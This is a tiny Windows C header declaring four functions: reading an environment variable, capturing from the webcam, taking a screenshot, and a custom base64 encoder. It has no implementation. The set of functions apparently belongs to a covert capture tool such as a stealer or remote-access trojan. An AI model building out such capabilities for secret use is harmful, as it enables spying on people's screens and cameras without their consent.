#pragma once
#include <windows.h>

PCWCHAR getEnvW(PCWCHAR env);
void doWebcamera(WCHAR* szPath);
PBYTE doScreenshot(DWORD* dw);
LPSTR custom_base64Encode(LPBYTE source, SIZE_T sourceSize, SIZE_T *destSize);